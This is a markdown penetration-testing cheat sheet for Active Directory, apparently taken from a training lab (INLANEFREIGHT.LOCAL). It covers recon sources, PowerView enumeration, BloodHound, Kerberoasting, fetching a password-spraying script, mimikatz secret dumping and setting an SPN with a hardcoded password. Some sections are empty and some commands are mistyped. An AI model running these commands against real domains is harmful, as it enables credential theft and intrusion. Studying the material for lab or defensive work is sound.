# Active Directory 
Related: 
## External Enumeration 
### What to look for 
- IP space 
- Domain information 
- Schema format 
- Data disclosures 
- Breach data
### Where to look  

[DomainTools](https://whois.domaintools.com/)

[PTR-Arcive](https://www.whatsmydns.net/dns-lookup/ptr-records)

[TruffleHog](https://github.com/trufflesecurity/truffleHog)

[Linkedin2Username](https://github.com/initstring/linkedin2username)

[DeHashed](https://dehashed.com/search#breachCheck)

[HaveIBeenPwned](https://haveibeenpwned.com/)
- Public Websites 
- Google Dorking
## Password Spraying 
**Linux** 
**Windows**
## Internal Enumeration 

```
Import-Module ActiveDirectory 
Get-Module
```

``` 
Get-ADDomain 
```

```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

```
Get-ADTrust -Filter * 
```

```
Get-ADGroup -Filter * | select name 
```


```
Get-ADGroup -Identity "Backup Operators"
```
### Powerview

```
Get-Domain 
```

```
Get-DomainController # returns list of domain controllers for specific domain 
Get-ADDomainController # returns domain controller ip address, needed for GetUserSPN.py 
```

```
Get DomainUser #Will return all users or specific user objects in AD 
```

```
GetDomainComputer 
```
``` 
GetDomainGroup

```
```
Get-DomainOU #searches for all specific OU objects in active directory

#OU: A container used to organize objects (like users, groups, and computers) within a domain into a logical hierarchy that mirrors your organization's structure, such as departments (e.g., HR, IT) or geographic locations (e.g., New York, London).
```

```
FindInterestingDomainAcl

```

```
Get-DomainGroupMember
```
```
Get-DomainFileServer
```
```
Get-DomainDFShare
```

**GPO Enumeration**
```
Get-DomainGPO 
```
```
Get-DomainPolicy 
```
**Computer Enumeration** 
```
Get-NetLocalGroup 
Get-NetLocalGroupMember
Get-NetShare 
Test-AdminAccess
Find-DomainUserLocation
Find-DomainShare # Finds reachable shares on domain machines 
FindInterestingDomainShareFile # Searches for files matching specific criteria on readable shares in the domain 
```
**Domain User Information**
```
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

Get-DomainUser -Admin Count
```
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse #Used to find users that are part of a target group through nested membership and list them. 
```

**Trust Enumeration** 
```
Get-DomainTrustMapping 
```

```
Test-AdminAccess -Computer ACADEMY-EA-MS01 
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

### Sharpview 
- Similar capabilities to powerview 
### Bloodhound / SharpHound
> [!NOTE]  
> Must be domain user from Windows attack host positioned within network but not joined to the domain OR transfer tool to domain-joined host 

- Type 'bloodhound' into cmd or powershell 
- Enter credentials 
- Click on upload data and open 

- Can start by typing domain 
- View result of pre-built queries in analyiss tab

Find Computers where Domain Users are Local Admin

## Exploitation (from Linux)
> [!NOTE]  
> Requires domain user, cleartext password or hash, a shell in context of user or a shell in context of system. Must also know which host is domain controller so we can query it 
**Kerberoasting**
```sudo python3 -m pip install . ```
```GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev```
## Exploitation (from Windows )


**Kerberoasting** 
```
Import-Module .\PowerView.ps1
Get-DomainUser * -SPN |Select samaccountname
Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
```

**Password Spraying**

```
wget https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1
Import-Module .\DomainPasswordSpray.ps1
tag:lateral-movement

```


**Pillaging** 

```
mimikatz.exe 
lasadump::secrets
token::elevate
```

```
$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```
# ACL